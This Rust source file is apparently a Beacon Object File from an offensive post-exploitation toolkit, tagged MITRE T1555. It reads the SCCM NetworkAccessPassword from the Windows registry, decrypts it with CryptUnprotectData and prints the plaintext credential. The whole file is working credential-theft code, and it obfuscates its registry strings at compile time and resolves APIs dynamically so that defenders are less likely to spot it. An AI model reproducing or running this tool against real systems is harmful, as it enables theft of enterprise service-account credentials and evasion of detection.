// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
#![no_std]
#![cfg_attr(not(test), no_main)]


use alloc::vec::Vec;

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555", name: "Credentials from Password Stores", tactic: "Credential Access" },
];

const ERROR_SUCCESS: u32 = 0;
const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

// DATA_BLOB = { cbData: u32, pbData: *mut u8 }
#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

dfr_fn!(
    crypt_unprotect_data(
        data_in: *const DataBlob,
        pp_sz_data_descr: *mut *mut u16,
        p_optional_entropy: *const DataBlob,
        pv_reserved: *mut core::ffi::c_void,
        p_prompt_struct: *const u8,
        dw_flags: u32,
        p_data_out: *mut DataBlob,
    ) -> i32,
    module = "crypt32.dll",
    api    = "CryptUnprotectData"
);

dfr_fn!(
    reg_open_key_ex_a(
        hkey: usize, subkey: *const i8, options: u32,
        sam_desired: u32, result: *mut usize,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExA"
);

dfr_fn!(
    reg_query_value_ex_a(
        hkey: usize, value: *const i8, reserved: *mut u32,
        reg_type: *mut u32, data: *mut u8, data_len: *mut u32,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegQueryValueExA"
);

dfr_fn!(
    reg_close_key(hkey: usize) -> u32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

dfr_fn!(
    local_free(mem: *mut u8) -> *mut u8,
    module = "kernel32.dll",
    api    = "LocalFree"
);

const HKEY_LOCAL_MACHINE: usize = 0x80000002usize;
const KEY_READ: u32 = 0x20019;

// SCCM credential path + value name — obfuscated at compile time. The strings
// are decrypted on-stack at use site so they never appear in `.rdata`.

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    obf_cstr! {
        let sccm_key   = c"SOFTWARE\\Microsoft\\SMS\\Mobile Client\\InventoryAgent";
        let sccm_value = c"NetworkAccessPassword";
    }

    let mut hkey: usize = 0;
    let rc = unsafe {
        reg_open_key_ex_a(HKEY_LOCAL_MACHINE, sccm_key.as_ptr() as *const i8, 0, KEY_READ, &mut hkey)
    }.map_err(|_| "RegOpenKeyExA resolve")?;

    if rc != ERROR_SUCCESS {
        println!("[*] SCCM key not found — SMS client may not be installed");
        return Ok(());
    }

    let mut reg_type: u32 = 0;
    let mut buf_size: u32 = 0;

    // First call: get size
    unsafe {
        reg_query_value_ex_a(hkey, sccm_value.as_ptr() as *const i8,
            core::ptr::null_mut(), &mut reg_type, core::ptr::null_mut(), &mut buf_size)
    }.map_err(|_| "RegQueryValueExA resolve")?;

    if buf_size == 0 {
        unsafe { let _ = reg_close_key(hkey); };
        println!("[*] NetworkAccessPassword value not found");
        return Ok(());
    }

    let mut encrypted: Vec<u8> = alloc::vec![0u8; buf_size as usize];
    let rc2 = unsafe {
        reg_query_value_ex_a(
            hkey, sccm_value.as_ptr() as *const i8,
            core::ptr::null_mut(), &mut reg_type,
            encrypted.as_mut_ptr(), &mut buf_size,
        )
    }.map_err(|_| "RegQueryValueExA(data) resolve")?;

    unsafe { let _ = reg_close_key(hkey); };

    if rc2 != ERROR_SUCCESS {
        return Err("RegQueryValueExA failed");
    }

    // SCCM stores an encrypted blob starting at offset 4 (skip DWORD length prefix)
    let blob_offset = if buf_size > 4 { 4usize } else { 0 };
    let blob_data = &mut encrypted[blob_offset..];

    let data_in = DataBlob {
        cb_data: blob_data.len() as u32,
        pb_data: blob_data.as_mut_ptr(),
    };

    let mut data_out = DataBlob { cb_data: 0, pb_data: core::ptr::null_mut() };

    let rc3 = unsafe {
        crypt_unprotect_data(
            &data_in,
            core::ptr::null_mut(),
            core::ptr::null(),
            core::ptr::null_mut(),
            core::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut data_out,
        )
    }.map_err(|_| "CryptUnprotectData resolve")?;

    if rc3 == 0 || data_out.pb_data.is_null() {
        return Err("CryptUnprotectData failed");
    }

    let cleartext_len = data_out.cb_data as usize;
    println!("SCCM NetworkAccessPassword (decrypted, {} bytes):", cleartext_len);
    let decrypted_bytes = unsafe { core::slice::from_raw_parts(data_out.pb_data, cleartext_len) };
    // Try as UTF-8 or print hex
    if let Ok(s) = core::str::from_utf8(decrypted_bytes) {
        println!("{}", s);
    } else {
        for &b in decrypted_bytes.iter().take(256) {
            rustbof::print!("{:02x}", b);
        }
        println!("");
    }

    unsafe { local_free(data_out.pb_data) };
    Ok(())
}
